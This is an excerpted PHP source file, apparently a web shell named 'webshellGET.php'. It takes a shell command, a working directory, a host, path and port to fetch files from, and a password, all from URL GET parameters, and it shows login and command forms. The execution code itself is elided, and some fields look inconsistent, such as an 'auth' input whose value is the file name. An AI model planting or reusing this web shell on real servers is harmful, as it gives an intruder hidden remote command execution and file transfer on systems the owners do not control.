...
if (isset($_GET['cmd'])) {
    $cmd = empty(urldecode($_GET['cmd'])) ? '' : urldecode($_GET['cmd']); 
} 
else{
	$cmd = '';
}
...
if (isset($_GET['cwd'])) {
    $cwd = empty(urldecode($_GET['cwd'])) ? getcwd() : urldecode($_GET['cwd']);
} 
else{
	$cwd = getcwd();
}
...
if (isset($_GET['fetch_host'])) {
	$fetch_host = empty(urldecode($_GET['fetch_host'])) ? $_SERVER['REMOTE_ADDR'] : urldecode($_GET['fetch_host']);
} 
else{
	$fetch_host = $_SERVER['REMOTE_ADDR'];
}

if (isset($_GET['fetch_path'])) {
	$fetch_path = empty(urldecode($_GET['fetch_path'])) ? '' : urldecode($_GET['fetch_path']);
} 
else{
	$fetch_path = '';
}

if (isset($_GET['fetch_port'])) {
	$fetch_port = empty(urldecode($_GET['fetch_port'])) ? '80' : urldecode($_GET['fetch_port']);
} 
else{
	$fetch_port = '80';
}
...
if (isset($_GET['pass'])) {
	$pass = empty(urldecode($_GET['pass'])) ? '' : urldecode($_GET['pass']);
} 
else{
	$pass = '';
}
...
if (! empty($passhash))
{
	...
	{
		$auth = empty(urldecode($_GET['auth'])) ? h($pass) : urldecode($_GET['auth']);
		if (h($auth) !== $passhash)
		{
			?>
				<form method="get" action="webshellGET.php">
					<?php e($passprompt); ?>
...
<form method="get" action="webshellGET.php"
	...
	<?php if (! empty($passhash)): ?>
		<input type="hidden" name="auth" value="webshellGET.php">
	<?php endif; ?>
	<table border="0">
